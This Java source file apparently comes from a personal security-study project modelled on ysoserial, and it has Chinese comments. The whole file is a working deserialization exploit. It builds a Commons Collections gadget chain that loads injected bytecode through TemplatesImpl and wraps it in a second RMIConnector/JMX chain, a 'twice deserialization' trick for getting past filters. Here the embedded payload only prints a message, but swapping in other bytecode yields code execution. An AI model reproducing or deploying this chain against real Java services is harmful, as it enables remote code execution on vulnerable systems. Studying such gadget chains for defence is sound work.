package com.sec.cwm.base.ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class twiceRMIdes {
    public static void main(String[] args) throws Exception {
        String bytecode=bytecode("C:\\Users\\cwm\\IdeaProjects\\javastudy\\target\\classes\\HelloTempImpl.class");
        byte[] code = Base64.getDecoder().decode(bytecode);
//        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTempImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

//        obj.newTransformer();
//        Transformer[] TransformMap=new Transformer[]{
//                new ConstantTransformer(obj),
//                new InvokerTransformer("newTransformer",null,null)
//        };
        InvokerTransformer transformer = new InvokerTransformer("getClass", null, null);
        Map innermap= new HashMap();
        Map outerMap = LazyMap.decorate(innermap, transformer);

        //创建一个TiedMapEntry对象，map放如上创建的LazyMap，key放如上创建好的TemplatesImpl
        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);

        //通过新建一个HashMap，pyt我们创建号的TiedMapEntry对象，反序列化时会调用TiedMapEntry的hashcode方法
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        //同样因为本地调试会改变outerMap里面的内容，所以最后我们需要清空里面的内容
        outerMap.clear();
        setFieldValue(transformer, "iMethodName", "newTransformer");
//        ByteArrayOutputStream baos=new ByteArrayOutputStream();
//        ObjectOutputStream oos=new ObjectOutputStream(baos);
//        oos.writeObject(expMap);
//        oos.close();
//        ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
//        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
//        ois.readObject();

        //将上面传入的一个getClass方法替换为我们真实的需要触发的方法newTransformer
        String s= serialize2Base64(expMap);
        System.out.println(s);
        RMIUnserialize(s);
    }


    public static void RMIUnserialize(String base64) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue2(jmxServiceURL, "urlPath", "/stub/" + base64);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
        Map<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazymap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, rmiConnector);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, null);
        map.remove(rmiConnector);
        setFieldValue2(lazymap, "factory", invokerTransformer);
        unserialize(hashMap);
    }


    public static byte[]  serialize(Object object) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
        ObjectOutputStream outputStream=new ObjectOutputStream(byteArrayOutputStream);
        outputStream.writeObject(object);
        return byteArrayOutputStream.toByteArray();

    }
    public static String  serialize2Base64(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        String s = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        return s;
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void setFieldValue1(Object object,String fieldName,String value) throws NoSuchFieldException, IllegalAccessException {
        Field field=object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object,value);
    }
    public static void setFieldValue2(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field f = obj.getClass().getDeclaredField(fieldName);
        f.setAccessible(true);
        f.set(obj, value);
    }

    public static void unserialize(Object obj) throws IOException, ClassNotFoundException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();

    }
    public static String bytecode(String filename) throws Exception {
        File file=new File(filename);
        FileInputStream fis = new FileInputStream(file);
        byte[] bytes = new byte[(int) file.length()];
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int a=0;
        while ((a = fis.read(bytes)) != -1) {
            // 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的
            // 下标0开始截取，a表示输入流read到的字节数。
            out.write(bytes, 0, a);
        }
        final Base64.Encoder encoder = Base64.getEncoder();
        String encodedText = encoder.encodeToString(bytes);
        return encodedText;
    }

}
